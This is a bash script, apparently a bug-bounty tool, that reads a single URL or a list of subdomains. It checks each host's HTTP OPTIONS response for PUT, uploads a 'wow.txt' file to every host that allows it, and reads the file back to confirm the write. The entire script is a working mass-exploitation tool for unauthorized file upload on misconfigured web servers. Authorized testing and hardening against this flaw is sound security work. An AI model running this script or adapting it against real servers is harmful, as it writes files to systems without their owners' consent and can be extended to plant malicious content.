#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Banner
show_banner() {
    echo -e "${PURPLE}"
    echo " ███▄ ▄███▓▓█████▄▄▄█████▓ ██░ ██  █     █░ ▒█████   █     █░"
    echo "▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▓██░ ██▒▓█░ █ ░█░▒██▒  ██▒▓█░ █ ░█░"
    echo "▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██▀▀██░▒█░ █ ░█ ▒██░  ██▒▒█░ █ ░█ "
    echo "▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░▓█ ░██ ░█░ █ ░█ ▒██   ██░░█░ █ ░█ "
    echo "▒██▒   ░██▒░▒████▒ ▒██▒ ░ ░▓█▒░██▓░░██▒██▓ ░ ████▓▒░░░██▒██▓ "
    echo "░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒ ░░▒░▒░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▓░▒ ▒  "
    echo "░  ░      ░ ░ ░  ░   ░     ▒ ░▒░ ░  ▒ ░ ░    ░ ▒ ▒░   ▒ ░ ░  "
    echo "       ░      ░  ░         ░  ░  ░    ░        ░ ░      ░    "
    echo "         made it by : @masturbyte | Ahmed Kori               "
    echo -e "${NC}"
}

# Check available HTTP methods
check_options() {
    url=$1
    response=$(curl -s -I -X OPTIONS "$url")
    allow=$(echo "$response" | grep -i "^Allow:" | awk '{for(i=2;i<=NF;i++) printf $i " "; print ""}')

    if [ -n "$allow" ]; then
        echo -e "${GREEN} [*] $url allows: $allow${NC}"
    else
        echo -e "${RED} [-] $url: Couldn't retrieve available methods${NC}"
    fi

    if [[ $allow == *"PUT"* ]]; then
        return 0
    else
        return 1
    fi
}

# PUT and GET requests
put_and_get() {
    subdomain=$1
    url="https://$subdomain/wow.txt"

    curl -s -X PUT -d "Hello poc" "$url"
    response_get=$(curl -s "$url")

    if [[ "$response_get" == "Hello poc" ]]; then
        echo -e "${GREEN}[+] Successfully uploaded wow.txt to $url${NC}"
    else
        echo -e "${RED}[-] Failed to upload wow.txt to $subdomain${NC}"
    fi
}

# Input check
if [[ $# -ne 1 ]]; then
    echo -e "${YELLOW}Usage: $0 subdomains.txt or $0 https://www.example.com${NC}"
    exit 1
fi

# Show banner
show_banner

input="$1"

# File or direct domain
if [[ -f "$input" ]]; then
    while IFS= read -r subdomain; do
        check_options "https://$subdomain"
        if [[ $? -eq 0 ]]; then
            put_and_get "$subdomain"
        fi
    done < "$input"
else
    subdomain=$(echo "$input" | sed 's|https\?://||')
    check_options "$input"
    if [[ $? -eq 0 ]]; then
        put_and_get "$subdomain"
    fi
fi
